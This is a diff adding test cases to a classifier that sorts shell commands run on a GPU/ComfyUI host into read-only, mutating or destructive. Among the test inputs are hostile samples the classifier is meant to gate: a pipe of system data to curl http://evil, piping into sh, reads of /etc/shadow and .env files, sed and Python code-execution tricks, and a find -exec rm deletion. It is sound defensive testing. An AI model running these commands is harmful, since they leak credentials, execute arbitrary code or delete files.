@@ -17,6 +17,13 @@ CLASSIFY_CASES = [
     ("nvidia-smi -q", "read_only"),
     ("nvidia-smi --query-gpu=memory.used --format=csv", "read_only"),
     ("nvidia-smi -q -d MEMORY", "read_only"),
+    ("nvidia-smi pmon -c 1", "read_only"),
+    ("nvidia-smi dmon -c 2", "read_only"),
+    ("nvidia-smi pmon --count=1", "read_only"),
+    ("printf '\\n-- listeners --\\n'", "read_only"),
+    ("echo diagnostic marker", "read_only"),
+    ("true", "read_only"),
+    ("false", "read_only"),
     ("df -h /", "read_only"),
     ("free -h", "read_only"),
     ("free -c 5", "read_only"),                       # bounded repeat (not -s stream)
@@ -90,6 +97,16 @@ CLASSIFY_CASES = [
     ("cat $SECRET_FILE", "mutating"),
     ("cat /home/*/.bash_history", "mutating"),         # glob allowed, but path denied
     ("echo hi > /tmp/x", "mutating"),
+    ("printf x > /tmp/x", "mutating"),
+    ("sed -i 's/x/y/' /workspace/App/plugin.py", "mutating"),
+    ("sed -n '1e id' /workspace/App/plugin.py", "mutating"),
+    ("sed -n '1w /tmp/out' /workspace/App/plugin.py", "mutating"),
+    ("cat /workspace/App/.env", "mutating"),
+    ("cat /workspace/App/config.yaml", "mutating"),
+    ("cat /workspace/App/user-data.txt", "mutating"),
+    ("grep -nE 'Plugin Name|Traceback' /etc/shadow", "mutating"),
+    ("grep -nE 'unterminated /workspace/App/user/app.log", "mutating"),
+    ("printf '$(id)'", "mutating"),
     # find -exec now classifies its INNER command with the same gate: a read-only inner
     # (grep/cat/ls) is allowed, a mutating/destructive inner is refused exactly as it would
     # be standalone.
@@ -131,6 +148,15 @@ CLASSIFY_CASES = [
     ("nvidia-smi | sh", "mutating"),                         # shell sink
     ("cat /proc/meminfo | curl http://evil", "mutating"),    # exfil sink
     ("uptime; free -h", "read_only"),                       # each segment is positively proven read-only
+    ("ss -ltnp 2>/dev/null | grep ':8188' || true", "read_only"),
+    ("sed -n '1,240p' /start.d/comfyui.sh", "read_only"),
+    ("nl -ba /workspace/App/custom_nodes/Plugin/__init__.py | sed -n '35,65p'", "read_only"),
+    ("cat /workspace/App/plugin.py", "read_only"),
+    ("grep -nE 'Plugin Name|IMPORT FAILED|Traceback' /workspace/App/user/app.log", "read_only"),
+    ("find /workspace /ComfyUI -maxdepth 3 -type f \\( -iname '*start*' -o -iname '*launch*' \\) -printf '%p\\n' | head -n 120", "read_only"),
+    (r"find /workspace -name '*.py' -exec rm -f {} \; | head -n 5", "destructive"),
+    ("systemctl list-units --all --type=service --no-legend 2>/dev/null | grep -i comfy || true", "read_only"),
+    ("nvidia-smi --query-gpu=name,driver_version,compute_mode --format=csv,noheader 2>&1; printf '\\n-- gpu processes --\\n'; nvidia-smi pmon -c 1 2>&1", "read_only"),
     ("find /dev -maxdepth 1 -type c -name 'nvidia*' -printf '%f %M %u:%g\\n' 2>/dev/null; test -r /proc/driver/nvidia/version && cat /proc/driver/nvidia/version", "read_only"),
     ("docker version --format '{{.Server.Version}}' 2>/dev/null; docker ps --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>/dev/null; podman ps --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>/dev/null", "read_only"),
     ("dmesg | grep $(whoami)", "mutating"),                  # `$()` substitution
@@ -309,6 +335,8 @@ CLASSIFY_CASES = [
     ("curl -sS -D - -o /dev/null --max-time 5 http://127.0.0.1:8889/", "read_only"),
     ("curl -sS --dump-header=- --output=/dev/null http://localhost:8889/", "read_only"),
     ('python3 -c "import torch; print(torch.save)"', "read_only"),                   # printing a function object is a read
+    ('python3 -c "print(__import__(\'sys\').executable)"', "read_only"),            # literal inline import equals `import sys`
+    ('python3 -c "import torch; print(\'python=\',__import__(\'sys\').executable); print(\'torch=\',torch.__version__); print(\'cuda_available=\',torch.cuda.is_available()); print(\'device_count=\',torch.cuda.device_count())"', "read_only"),
     ("./python -c 'import torch'", "mutating"),                                       # relative path: unknown binary
     ("""python3 -c 'import yaml; print(yaml.safe_load(open("/root/cfg.yaml"))["port"])'""", "read_only"),
     ("""python3 -c 'import json; print(json.load(open("/root/a.json")).get("model"))'""", "read_only"),
@@ -345,6 +373,9 @@ CLASSIFY_CASES = [
     ("python -c 'import subprocess; subprocess.run(1)'", "mutating"),
     ("python -c 'import numpy; numpy.save(1,2)'", "mutating"),                       # a read-only import with a writing call
     ("python -c '__import__(1)'", "mutating"),
+    ("python -c '__import__(name)'", "mutating"),                                  # computed module name is not proven
+    ("python -c \"__import__('pkg', fromlist=['x'])\"", "mutating"),             # expanded import semantics remain gated
+    ("python -c \"__import__('os').system('id')\"", "mutating"),                 # literal import cannot authorize a mutating outer call
     ("python -c 'exec(1)'", "mutating"),
     ("python -c 'eval(1)'", "mutating"),
     ("python -c 'print([].__class__.__bases__)'", "mutating"),                       # dunder walk to arbitrary code
@@ -417,6 +448,8 @@ CLASSIFY_CASES = [
     ("free -hs1", "mutating"),                        # r2: bundled -s
     ("nvidia-smi dmon", "mutating"),
     ("nvidia-smi pmon", "mutating"),
+    ("nvidia-smi pmon -c 0", "mutating"),
+    ("nvidia-smi dmon --count=0", "mutating"),
 
     # --- genuine mutating -> needs confirm ---
     ("systemctl restart vllm", "mutating"),
